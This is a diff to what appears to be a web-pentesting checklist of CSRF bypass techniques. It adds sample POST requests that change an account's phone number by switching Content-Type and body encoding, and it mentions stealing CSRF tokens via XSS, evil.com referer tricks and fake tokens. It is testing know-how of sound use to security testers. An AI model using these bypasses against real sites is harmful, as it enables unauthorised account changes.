@@ -247,7 +247,32 @@ Referer: https://evil.com/test@example.com
 {"phone":"01111111118","a":""}
 ```
 
-*   [ ] &#x20;**Bypass CSRF Protection by Using XSS**
+* [ ] **Bypass by changing Content Type and Body Encoding**&#x20;
+
+```
+POST /phone.json
+Host: account.example.com
+Cookie: session_cookie=YOUR_SESSION_COOKIE;
+Content type: application/json
+
+{"phone":"01111111118","a":""}
+--------------
+POST /phone.json
+Host: account.example.com
+Cookie: session_cookie=YOUR_SESSION_COOKIE;
+Content type: application/x-www-form-urlencoded
+
+phone=01111111118
+-----------------------------
+POST /phone.json
+Host: account.example.com
+Cookie: session_cookie=YOUR_SESSION_COOKIE;
+Content type: plain/text
+
+phone=01111111118
+```
+
+*   [ ] **Bypass CSRF Protection by Using XSS**
 
     Steal victim CSRF Token Via XSS Vulnerability
 * [ ] **Replace the token with unreal token but with the same length**
